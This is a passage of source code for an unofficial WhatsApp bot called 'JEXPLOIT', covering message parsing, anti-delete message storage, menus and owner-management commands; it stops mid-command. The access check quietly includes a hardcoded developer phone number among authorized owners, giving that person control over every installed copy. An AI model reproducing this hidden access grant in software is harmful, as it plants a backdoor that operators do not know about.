require('../config')
const yts = require('yt-search')
const fs = require('fs')
const axios = require('axios')
const googleTTS = require('google-tts-api')
const devKelvin = '256742932677';
const checkDiskSpace = require('check-disk-space').default;
const chalk = require("chalk")
const fetch = require("node-fetch")
const FormData = require('form-data')
const jimp = require("jimp")
const { fromBuffer } =  require('file-type')
const cheerio = require('cheerio')
const os = require('os')
const fg = require('api-dylux')
const PDFDocument = require('pdfkit')
const {translate} = require('@vitalets/google-translate-api')
const path = require('path')
const { getDevice } = require('@whiskeysockets/baileys')
const fsp = fs.promises;
const lolcatjs = require('lolcatjs')
const speed = require('performance-now')
const { performance } = require("perf_hooks")
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const util = require("util")
const timezones = global.timezones || "Africa/Kampala"; // Default to Uganda timezone
const acrcloud = require ('acrcloud')
const moment = require("moment-timezone")
const { spawn, exec, execSync } = require('child_process')
const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent,
generateWAMessageContent, getContentType, downloadContentFromMessage,prepareWAMessageMedia } = require("@whiskeysockets/baileys")

const { 
  smsg, 
  sendGmail, 
  formatSize, 
  isUrl, 
  generateMessageTag, 
  CheckBandwidth, 
  getBuffer, 
  getGroupAdmins, 
  getSizeMedia, 
  runtime, 
  fetchJson, 
  sleep, 
  getRandom 
} = require('./lib/myfunction')

const { obfuscateJS } = require("./lib/encapsulation");
const db = require('./Core/databaseManager');
const { handleMediaUpload } = require('./lib/catbox');
const {styletext, remind, Wikimedia, wallpaper} = require('./lib/scraper')
const { 
    setMenu1,
    setMenu2,
    sendMenu,
    setMenu3,
    setMenu4,
    setMenu5,
    setMenu6,
    setAwesomeMenu,
    resetMenu,
    showCurrentMenu, 
    loadMenuConfig 
} = require('./DevKelvin/menu');
const { Remini } =require('./lib/remini')
const {
 fetchMp3DownloadUrl,
  fetchVideoDownloadUrl,
  saveStatusMessage,
  acr,
  handleAntiEdit,
  loadStoredMessages,
  saveStoredMessages,
  storeMessage,
  ephoto,
  loadBlacklist,
  antipromoteCommand,
  antidemoteCommand,
  handleAntiTag,
  handleAntiTagAdmin,
  handleLinkViolation,
  checkAndHandleLinks,
  detectUrls,
  delay,
  recordError,
  shouldLogError } = require('../Jex')
  

const { generateSettingsText, 
getProfilePictureDescription,
getOnlineDescription,
getReadReceiptDescription,
getGroupAddDescription,
getLastSeenDescription
} = require('./KelvinCmds/owner');

const {  takeCommand, musicCommand, ytplayCommand, handleMediafireDownload,  InstagramCommand, telestickerCommand, playCommand } = require('./KelvinCmds/commands')
const { getInactiveUsers, isAdmin, checkAdminStatus, addUserMessage, getActiveUsers } = require('./KelvinCmds/group')
const {
veniceAICommand,
mistralAICommand,
perplexityAICommand,
bardAICommand,
gpt4NanoAICommand,
kelvinAICommand,
claudeAICommand
} = require('./KelvinCmds/ai');
const { KelvinVideo } = require('./KelvinCmds/video');
const { dareCommand, truthCommand } = require('./KelvinCmds/fun');
const { tiktokSearch } = require('./KelvinCmds/TikTok');
const { playstoreSearch } = require('./KelvinCmds/playstore');
const sports = require('./KelvinCmds/sport');
const { handleAutoReact } = require('./KelvinCmds/autoreact');
const { handleAutoRead } = require('./KelvinCmds/autoread');
const { handleAutoTyping } = require('./KelvinCmds/autotyping');
const { handleAIChatbot } = require('./KelvinCmds/chatbot');
const { handleAutoRecording } = require('./KelvinCmds/autorecord');
const { handleAntiDelete } = require('./KelvinCmds/antidelete');
const { cleaningSession } = require('./lib/botSession'); 
const {fetchReactionImage} = require('./lib/reaction')
const { toAudio } = require('./lib/converter');
const { remini } = require('./lib/remini')
const { jadibot, stopjadibot, listjadibot } = require('./jadibot')

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
try {
const body = (m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "")
const budy = (typeof m.text === 'string' ? m.text : '')
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0]
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key)
// ========== STORE MESSAGE FOR ANTI-DELETE ==========
if (m.message && m.key && !m.key.fromMe) {
    storeMessage(m.chat, m.key.id, {
        key: m.key,
        message: m.message,
        messageTimestamp: m.messageTimestamp,
        pushName: m.pushName || "Unknown"
    });
}
const { sender } = m;
const from = m.key.remoteJid;
const chatId = m.chat;
const isGroup = from.endsWith("@g.us");
const senderId = m.key.participant || from; // This gets the actual sender JID
// database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'))
const botNumber = await conn.decodeJid(conn.user.id)


async function checkAccess(sender) {
    try {
        // Normalize the sender number
        const normalizedSender = sender.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        
        const sudoUsers = await db.getSudo(botNumber) || [];
        
        // Get owners from database (you can store owners in db too)
        const owners = await db.get(botNumber, 'owners', []);
        
        // Create array of all authorized numbers (normalized)
        const authorizedNumbers = [
            botNumber,
            devKelvin,
            ...owners,
            ...sudoUsers
        ]
        .filter(num => num) // Remove null/undefined
        .map(num => {
            if (!num) return null;
            const cleanNum = num.replace(/[^0-9]/g, "");
            return cleanNum ? cleanNum + "@s.whatsapp.net" : null;
        })
        .filter(num => num); // Remove any nulls
        
        // Check if sender is in authorized list
        return authorizedNumbers.includes(normalizedSender);
    } catch (error) {
        console.error('Error in checkAccess:', error);
        return false;
    }
}
const Access = await checkAccess(m.sender);

let prefix = "."; // Default prefix

try {
    // Get prefix from SQLite
    prefix = await db.get(botNumber, 'prefix', '.');
} catch (error) {
    console.error('Error loading prefix from database:', error);
    prefix = "."; // Fallback to default
}

try {
    const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
    
    // Handle different possible values
    if (typeof alwaysonlineSetting === 'boolean') {
        global.alwaysonline = alwaysonlineSetting;
    } else if (typeof alwaysonlineSetting === 'string') {
        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
    } else {
        global.alwaysonline = false; // Fallback
    }
} catch (error) {
    console.error('Error loading alwaysonline from database:', error);
    global.alwaysonline = false; // Default fallback
}


const isCmd = body?.startsWith?.(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const pushname = m.pushName || "No Name";
const text = q = args.join(" ")
const fatkuns = m.quoted || m;
const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] : fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime)
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')


const senderNumber = m.sender.split('@')[0];


let groupMetadata = null;
let groupName = "";
let participants = [];
let groupAdmins = [];
let isBotAdmins = false;
let groupOwner = "";
let isGroupOwner = false;
let isGroupAdmins = false;

// Only fetch group metadata if it's a group message
if (m.isGroup) {
    try {
        groupMetadata = await conn.groupMetadata(m.chat);
        groupName = groupMetadata?.subject || "";
        participants = groupMetadata?.participants || [];
        groupAdmins = await getGroupAdmins(participants);
        isBotAdmins = groupAdmins.includes(botNumber);
        groupOwner = groupMetadata?.owner || "";
        isGroupOwner = (groupOwner ? groupOwner : groupAdmins).includes(m.sender);
        isGroupAdmins = groupAdmins.includes(m.sender);
    } catch (error) {
        // Silently handle metadata fetch errors - don't spam console
        // These often happen during connection issues or rate limits
    }
}

const peler = fs.readFileSync('./start/lib/Media/Jexploit.jpg')
const cina = fs.readFileSync('./start/lib/Media/Jex.jpg')
function getRandomImage() {
const randomIndex = Math.floor(Math.random() * cina.length)
return cina[randomIndex]
}
const cinahitam = getRandomImage()
async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
const Usage = prefix + command
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const reaction = async (jidss, emoji) => {
conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
}


//  function to download media from message
async function downloadMedia(quotedMsg, type) {
    try {
        const media = await downloadContentFromMessage(quotedMsg, type);
        let buffer = Buffer.from([]);
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    } catch (error) {
        throw new Error(`Failed to download ${type}: ${error.message}`);
    }
}

async function isAdminKelvin(conn, chatId, senderId) {
        try {
            const groupMetadata = await conn.groupMetadata(chatId);
            
            const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
            
            const participant = groupMetadata.participants.find(p => 
                p.id === senderId || 
                p.id === senderId.replace('@s.whatsapp.net', '@lid') ||
                p.id === senderId.replace('@lid', '@s.whatsapp.net')
            );
            
            const bot = groupMetadata.participants.find(p => 
                p.id === botId || 
                p.id === botId.replace('@s.whatsapp.net', '@lid')
            );
            
            const isBotAdmin = bot && (bot.admin === 'admin' || bot.admin === 'superadmin');
            const isSenderAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');

            if (!bot) {
                return { isSenderAdmin, isBotAdmin: true };
            }

            return { isSenderAdmin, isBotAdmin };
        } catch (error) {
            console.error('Error in isAdmin:', error);
            return { isSenderAdmin: false, isBotAdmin: false };
        }
}

let isSenderAdmin = false;
let isBotAdmin = false;

if (isGroup && m.sender) {
    try {
        const adminResult = await isAdminKelvin(conn, from, senderId);
        isSenderAdmin = adminResult.isSenderAdmin;
        isBotAdmin = adminResult.isBotAdmin;
        
    } catch (error) {
        console.error('Error checking admin status:', error);
        isSenderAdmin = false;
        isBotAdmin = false;
    }
}
// ============================================

// function that converts to audio and video====
async function webp2mp4(source) {
  let form = new FormData();
  let isUrl = typeof source === 'string' && /https?:\/\//.test(source);
  
  form.append('new-image-url', isUrl ? source : '');
  form.append('new-image', isUrl ? '' : source, 'image.webp');
  
  let res = await fetch('https://ezgif.com/webp-to-mp4', {
    method: 'POST',
    body: form
  });
  
  let html = await res.text();
  let $ = cheerio.load(html);
  let form2 = new FormData();
  let obj = {};
  
  $('form input[name]').each((_, el) => {
    obj[$(el).attr('name')] = $(el).val();
    form2.append($(el).attr('name'), $(el).val());
  });
  
  let res2 = await fetch('https://ezgif.com/webp-to-mp4/' + obj.file, {
    method: 'POST',
    body: form2
  });
  
  let html2 = await res2.text();
  let $2 = cheerio.load(html2);
  return new URL($2('div#output > p.outfile > video > source').attr('src'), res2.url).toString();
}


//  functions that help in togstatus
async function buildPayloadFromQuoted(quotedMessage, conn) {
    if (quotedMessage.videoMessage) {
        const buffer = await downloadToBuffer(quotedMessage.videoMessage, 'video');
        return { 
            video: buffer, 
            caption: quotedMessage.videoMessage.caption || '',
            gifPlayback: quotedMessage.videoMessage.gifPlayback || false,
            mimetype: quotedMessage.videoMessage.mimetype || 'video/mp4'
        };
    } else if (quotedMessage.imageMessage) {
        const buffer = await downloadToBuffer(quotedMessage.imageMessage, 'image');
        return { 
            image: buffer, 
            caption: quotedMessage.imageMessage.caption || '',
            mimetype: quotedMessage.imageMessage.mimetype || 'image/jpeg'
        };
    } else if (quotedMessage.audioMessage) {
        const buffer = await downloadToBuffer(quotedMessage.audioMessage, 'audio');
        if (quotedMessage.audioMessage.ptt) {
            const audioVn = await toVN(buffer);
            return { audio: audioVn, mimetype: "audio/ogg; codecs=opus", ptt: true };
        } else {
            return { audio: buffer, mimetype: quotedMessage.audioMessage.mimetype || 'audio/mpeg', ptt: false };
        }
    } else if (quotedMessage.stickerMessage) {
        try {
            const buffer = await downloadToBuffer(quotedMessage.stickerMessage, 'sticker');
            const imageBuffer = await convertStickerToImage(buffer, quotedMessage.stickerMessage.mimetype);
            return { 
                image: imageBuffer, 
                caption: quotedMessage.stickerMessage.caption || '',
                mimetype: 'image/png',
                convertedSticker: true,
                originalMimetype: quotedMessage.stickerMessage.mimetype
            };
        } catch (conversionError) {
            console.error('Sticker conversion failed:', conversionError);
            return { text: `⚠️ Sticker conversion failed (${quotedMessage.stickerMessage.mimetype || 'unknown'})` };
        }
    } else if (quotedMessage.conversation || quotedMessage.extendedTextMessage?.text) {
        const textContent = quotedMessage.conversation || quotedMessage.extendedTextMessage?.text || '';
        return { text: textContent };
    }
    return null;
}

async function downloadToBuffer(message, type) {
    const stream = await downloadContentFromMessage(message, type);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
    return buffer;
}

async function convertStickerToImage(stickerBuffer, mimetype = 'image/webp') {
    try {
        return await convertStickerToImageSimple(stickerBuffer);
    } catch (error) {
        console.error('Sticker conversion failed:', error);
        throw new Error(`Sticker conversion failed: ${error.message}`);
    }
}

async function convertStickerToImageSimple(stickerBuffer) {
    if (stickerBuffer.slice(0, 12).toString('hex').includes('52494646')) { // RIFF header
        console.log('Detected WebP sticker, using fallback conversion');
        return stickerBuffer; 
    }
    return stickerBuffer;
}

async function toVN(inputBuffer) {
    return new Promise((resolve, reject) => {
        const inStream = new PassThrough();
        inStream.end(inputBuffer);
        const outStream = new PassThrough();
        const chunks = [];
        ffmpeg(inStream)
            .noVideo()
            .audioCodec("libopus")
            .format("ogg")
            .audioBitrate("48k")
            .audioChannels(1)
            .audioFrequency(48000)
            .on("error", reject)
            .on("end", () => resolve(Buffer.concat(chunks)))
            .pipe(outStream, { end: true });
        outStream.on("data", chunk => chunks.push(chunk));
    });
}

async function sendGroupStatus(conn, jid, content) {
    const inside = await generateWAMessageContent(content, { upload: conn.waUploadToServer });
    const messageSecret = crypto.randomBytes(32);
    const m = generateWAMessageFromContent(jid, {
        messageContextInfo: { messageSecret },
        groupStatusMessageV2: { message: { ...inside, messageContextInfo: { messageSecret } } }
    }, {});
    await conn.relayMessage(jid, m.message, { messageId: m.key.id });
    return m;
}

function detectMediaType(quotedMessage, payload = null) {
    if (!quotedMessage) return 'Text';
    if (quotedMessage.videoMessage) return 'Video';
    if (quotedMessage.imageMessage) return 'Image';
    if (quotedMessage.audioMessage) return 'Audio';
    if (quotedMessage.stickerMessage) {
        if (payload && payload.convertedSticker) return 'Sticker → Image';
        return 'Sticker';
    }
    return 'Text';
}

function getHelpText() {
    return `
✦ *GROUP STATUS* ✦

Commands:
✦ togroupstatus / .tosgroup

Usage:
✦ tosgroup text
✦ Reply to media/sticker with .tosgroup
✦ Add caption after command`;
}



  // Function to check bandwidth (download/upload)
  async function checkBandwidth() {
    // This is a simplified implementation
    // For more accurate results, you might want to use a dedicated library
    return {
      download: 'N/A', // You can implement actual measurement here
      upload: 'N/A'    // You can implement actual measurement here
    };
  }
//*---------------------------------------------------------------*//





//<================================================>//



// Validate connection object
function isValidConn(conn) {
    return conn && 
           typeof conn === 'object' && 
           typeof conn.sendMessage === 'function' &&
           typeof conn.decodeJid === 'function' &&
           conn.user && 
           conn.user.id;
}



//================== [ CONSOLE LOG] ==================//
const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
const timez = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm:ss z');
const datez = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");

if (m.message) {
  lolcatjs.fromString(`┏━━━━━━━━━━━━━『  JEXPLOIT  』━━━━━━━━━━━━━─`);
  lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
  lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
  lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
  lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
  lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
  lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
}
//<================================================>//
        conn.sendPresenceUpdate('uavailable', from)
              
let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}
const reply = (teks) => {
    const safeText = teks || ''; // this safety check
    conn.sendMessage(m.chat, {
    text: safeText, // Use safeText instead of teks
    contextInfo: {
    mentionedJid: [sender],
    externalAdReply: {
    title: "",
    body: `${pushname}`,
    thumbnail: peler,
    sourceUrl: 'JEXPLOIT BOT',
    renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }

await handleAutoRecording(m, conn, botNumber);
await handleAutoRead(m, conn, botNumber);
await handleAutoTyping(m, conn, botNumber);
await handleAutoReact(m, conn, botNumber);
await handleAIChatbot(m, conn, body, from, isGroup, botNumber, isCmd, prefix);


if (global.alwaysonline === true || global.alwaysonline === 'true') {
    if (m.message && !m.key.fromMe) {
        try {
            await conn.sendPresenceUpdate("available", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            // Silently handle error - don't spam console
        }
    }
} else {
    // Default behavior - send unavailable presence
    if (m.message && !m.key.fromMe) {
        try {
            await conn.sendPresenceUpdate("unavailable", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            // Silently handle error
        }
    }
}

if (m.isGroup && body && !m.key.fromMe) {
    // Just call the function - it will check settings internally
    await handleLinkViolation(conn, m, {
        key: m.key,
        message: m.message
    }, botNumber);
}

if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
    
    if (!m.isAdmin) {
        await conn.deleteMessage(m.chat, m.key).catch(() => {});
    }
  
}

// ========== ANTI-DELETE EXECUTION ==========
if (global.antidelete && m.message?.protocolMessage?.type === 0 && m.message?.protocolMessage?.key) {
    await handleAntiDelete(m, conn, from, isGroup, botNumber);
}




// ========== ANTI-EDIT EXECUTION ==========
if (global.antiedit && m.message?.protocolMessage?.editedMessage) {
    await handleAntiEdit(m, conn);
}


if (m.isGroup && body) {
    await handleAntiTag(conn, m, botNumber);
}

if (m.isGroup && body) {
    await handleAntiTagAdmin(conn, {
        chat: m.chat,
        sender: m.sender,
        message: m.message,
        key: m.key,
        isGroup: true,
        pushName: m.pushName || ''
    });
}

if (m.isGroup && body) {
    await handleAntiTagAdmin(conn, {
        chat: m.chat,
        sender: m.sender,
        message: m.message,
        key: m.key,
        isGroup: true,
        pushName: m.pushName || ''
    });
}

// Track active users in groups - FIX THIS SECTION
if (m.isGroup && !m.key.fromMe && body && body.trim().length > 0) {
    try {
        await addUserMessage(conn, from, sender);
    } catch (error) {
        console.error('Error tracking user activity:', error.message);
    }
}


switch (command) {
case 'menu':
case 'Rober':
case 'kevin':
case 'jex': {
    // Send loading message first
    const loadingMsg = await conn.sendMessage(m.chat, { 
        text: '*Loading menu...*' 
    }, { quoted: m });

    try {
        await sendMenu(conn, m, prefix, global);
        // Loading message will remain visible along with the menu
    } catch (error) {
        console.error('Error in menu command:', error);
        await conn.sendMessage(m.chat, {
            text: '❌ Error displaying menu. Please try again!'
        });
    }
    break;
}
    case 'setmenu1':
    case 'menu1': {
        if (!Access) return reply(mess.owner);
        await setMenu1(conn, m);
        break;
    }

    case 'setmenu2':
    case 'menu2': {
        if (!Access) return reply(mess.owner);
        await setMenu2(conn, m);
        break;
    }

    case 'setmenu3':
    case 'menu3': {
        if (!Access) return reply(mess.owner);
        await setMenu3(conn, m);
        break;
    }

    case 'setmenu4':
    case 'menu4': {
        if (!Access) return reply(mess.owner);
        await setMenu4(conn, m);
        break;
    }

    case 'setmenu5':
    case 'menu5': {
        if (!Access) return reply(mess.owner);
        await setMenu5(conn, m);
        break;
    }

    case 'setmenu6':
    case 'menu6': {
        if (!Access) return reply(mess.owner);
        await setMenu6(conn, m);
        break;
    }    
case 'showmenu':
case 'currentmenu': {
    await showCurrentMenu(conn, m);
    break;
}

case 'menuconfig':
case 'menuarrangement': {
    const menuConfig = loadMenuConfig();
    const presetNames = {
        'preset1': 'Default Order',
        'preset2': 'Download & AI Focus', 
        'preset3': 'Features & AI Focus'
    };
    
    await reply(`📋 *Menu Configuration*\n\n` +
        `Current Preset: ${presetNames[menuConfig.preset] || 'Default'}\n\n` +
        `Available Presets:\n` +
        `• ${prefix}setmenu1 - Default order\n` +
        `• ${prefix}setmenu2 - Download & AI focus\n` +
        `• ${prefix}setmenu3 - Features & AI focus\n` +
        `• ${prefix}showmenu - Show current arrangement`);
    break;
}
case 'setawesomemenu': {
    try {
        
        // Check if user is owner/admin
        if (!Access) {
            return reply(mess.owner);
        }
        
        await setAwesomeMenu(conn, m);
        
        // Send success reaction
        await conn.sendMessage(m.chat, { react: { text: "✨", key: m.key } });
        
    } catch (error) {
        console.error('Error in setawesomemenu:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply('❌ Failed to set awesome menu format!');
    }
}
break
case 'resetawesomemenu': {
    try {
        if (!Access) {
            return reply(mess.owner);
        }
        
        await resetMenu(conn, m);
        
        // Send success reaction
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        
    } catch (error) {
        console.error('Error in resetmenu:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply('❌ Failed to reset menu format!');
    }
}
break
case 'antiedit': {
    if (!Access) return reply(mess.owner);
    
    const subcommand = args[0]?.toLowerCase();
    
    if (!subcommand) {
        const currentMode = await db.get(botNumber, 'antiedit', 'off');
        return reply(`*ANTI-EDIT SETTINGS*

Current Mode: ${currentMode}

📌 *Commands:*
• ${prefix}antiedit on - Enable anti-edit (default: chat mode)
• ${prefix}antiedit off - Disable anti-edit
• ${prefix}antiedit chat - Send alerts to same chat
• ${prefix}antiedit private - Send alerts to bot owner's inbox
• ${prefix}antiedit status - Show current settings

*Modes:*
• chat - Alerts sent to same chat where editing happened
• private - Alerts sent to bot owner's private inbox
• off - Anti-edit disabled`);
    }
    
    switch(subcommand) {
        case 'on': {
            // Default to chat mode when turning on
            await db.set(botNumber, 'antiedit', 'chat');
            reply(`✅ Anti-edit enabled (chat mode)`);
            break;
        }
        
        case 'off': {
            await db.set(botNumber, 'antiedit', 'off');
            reply(`✅ Anti-edit disabled`);
            break;
        }
        
        case 'chat': {
            await db.set(botNumber, 'antiedit', 'chat');
            reply(`✅ Anti-edit set to chat mode (alerts sent to same chat)`);
            break;
        }
        
        case 'private': {
            await db.set(botNumber, 'antiedit', 'private');
            reply(`✅ Anti-edit set to private mode (alerts sent to bot owner)`);
            break;
        }
        
        case 'status': {
            const currentMode = await db.get(botNumber, 'antiedit', 'off');
            let statusMsg = `*📊 ANTI-EDIT STATUS*\n\n`;
            statusMsg += `Mode: *${currentMode}*\n`;
            statusMsg += `Status: ${currentMode !== 'off' ? '✅ ENABLED' : '❌ DISABLED'}\n\n`;
            
            if (currentMode === 'chat') {
                statusMsg += `📍 Alerts will be sent to the same chat where editing occurred.`;
            } else if (currentMode === 'private') {
                statusMsg += `📍 Alerts will be sent to bot owner's private inbox.`;
            } else {
                statusMsg += `📍 Anti-edit is currently disabled.`;
            }
            
            reply(statusMsg);
            break;
        }
        
        default: {
            reply(`❌ Invalid option! Use: on, off, chat, private, status`);
        }
    }
    break;
}
case 'antidelete': {
    if (!Access) return reply(mess.owner);
    
    const subcommand = args[0]?.toLowerCase();
    const value = args[1]?.toLowerCase();
    
    if (!subcommand) {
        const currentMode = await db.get(botNumber, 'antidelete', 'off');
        
        return reply(`*Anti-Delete System*
        
Usage:
• ${prefix}antidelete on - Enable anti-delete (default: chat mode)
• ${prefix}antidelete off - Disable anti-delete
• ${prefix}antidelete chat - Send alerts to same chat
• ${prefix}antidelete private - Send alerts to bot owner's inbox
• ${prefix}antidelete status - Show current settings

Current Mode: ${currentMode}
Enabled: ${currentMode !== 'off' ? '✅' : '❌'}

📌 *Modes:*
• chat - Alerts sent to same chat where deletion happened
• private - Alerts sent to bot owner's private inbox
• off - Anti-delete disabled`);
    }
    
    switch(subcommand) {
        case 'on': {
            // ✅ Default to chat mode when turning on
            await db.set(botNumber, 'antidelete', 'chat');
            reply(`*Successfully enabled antidelete chat mode*`);
            break;
        }
        
        case 'off': {
            // ✅ Save to SQLite
            await db.set(botNumber, 'antidelete', 'off');
            reply(`*Successfully disabled antidelete*`);
            break;
        }
        
        case 'chat': {
            // ✅ Save to SQLite
            await db.set(botNumber, 'antidelete', 'chat');
            reply(`*Successfully enabled antidelete chat mode*`);
            break;
        }
        
        case 'private': {
            // ✅ Save to SQLite
            await db.set(botNumber, 'antidelete', 'private');
            reply(`*Successfully enabled antidelete private mode*`);
            break;
        }
        
        case 'status': {
            // ✅ Get current status from SQLite
            const currentMode = await db.get(botNumber, 'antidelete', 'off');
            reply(`*Anti-Delete Status*
            
Mode: ${currentMode}
Enabled: ${currentMode !== 'off' ? '✅' : '❌'}

Chat Mode: Sends alerts to the same chat
Private Mode: Sends alerts to bot owner's inbox`);
            break;
        }
        
        default: {
            reply(`❌ Invalid subcommand. Use: on, off, chat, private, status`);
        }
    }
    break;
}
// ========== PREFIX COMMAND ==========
case 'setprefix':
case 'prefix': {
    if (!Access) return reply(mess.owner);
    
    const newPrefix = args[0];
    if (!newPrefix) {
        const currentPrefix = await db.get(botNumber, 'prefix', '.');
        return reply(`*📝 PREFIX SETTINGS*\n\nCurrent prefix: *${currentPrefix}*\n\nUsage: ${currentPrefix}setprefix <new prefix>\nExample: ${currentPrefix}setprefix !`);
    }
    
    await db.set(botNumber, 'prefix', newPrefix);
    reply(`✅ Prefix has been changed to: *${newPrefix}*`);
    break;
}
case 'alwaysonline':
case 'online': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'alwaysonline', false);
        return reply(`❌ Usage: ${prefix}alwaysonline <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'alwaysonline', boolValue);
    global.alwaysonline = boolValue; // Update global variable
    
    reply(`✅ Always online mode ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'addowner': {
    if (!Access) return reply(mess.owner);
    
    const user = m.mentionedJid[0] || args[0];
    if (!user) return reply('❌ Mention user or provide JID');
    
    // Get current owners
    let owners = await db.get(botNumber, 'owners', []);
    
    // Normalize the JID
    const normalizedJid = user.includes('@s.whatsapp.net') ? user : user + '@s.whatsapp.net';
    
    if (!owners.includes(normalizedJid)) {
        owners.push(normalizedJid);
        await db.set(botNumber, 'owners', owners);
        reply(`✅ @${normalizedJid.split('@')[0]} added to owners list!`, { mentions: [normalizedJid] });
    } else {
        reply(`❌ User is already an owner!`);
    }
    break;
}

case 'removeowner': {
    if (!Access) return reply(mess.owner);
    
    const user = m.mentionedJid[0] || args[0];
    if (!user) return reply('Mention user or provide JID');
    
    // Get current owners
    let owners = await db.get(botNumber, 'owners', []);
    
    // Normalize the JID
    const normalizedJid = user.includes('@s.whatsapp.net') ? user : user + '@s.whatsapp.net';
    
    const index = owners.indexOf(normalizedJid);
    if (index > -1) {
        owners.splice(index, 1);
        await db.set(botNumber, 'owners', owners);
        reply(`✅ @${normalizedJid.split('@')[0]} removed from owners list!`, { mentions: [normalizedJid] });
    } else {
        reply(`❌ User is not in owners list!`);
    }
    break;
}

case 'listowners': {
    const owners = await db.get(botNumber, 'owners', []);
    const sudo = await db.getSudo(botNumber);
    
    if (owners.length === 0 && sudo.length === 0) {
        return reply('📋 No owners or sudo users found.');
    }
    
    let message = `*AUTHORIZED USERS*\n\n`;
    
    if (owners.length > 0) {
        message += `*📋 Owners:*\n`;
        owners.forEach((jid, i) => {
            message += `${i+1}. @${jid.split('@')[0]}\n`;
        });
        message += `\n`;
    }
    
    if (sudo.length > 0) {
        message += `*Sudo Users:*\n`;
        sudo.forEach((jid, i) => {
            message += `${i+1}. @${jid.split('@')[0]}\n`;
        });
    }
    
    await conn.sendMessage(m.chat, {
        text: message,
        mentions: [...owners, ...sudo]
    }, { quoted: m });
    break;
}
case "setownernumber": {
    if (!Access) return reply(mess.owner);
    
    if (args.length < 1) return reply(`Example: ${prefix + command} 256755585369\n\nThis will change the owner's number in the database`);

    // Join all arguments to capture the full number including spaces
    let fullInput = args.join(' ');
    let newNumber = fullInput.replace(/\D/g, '');

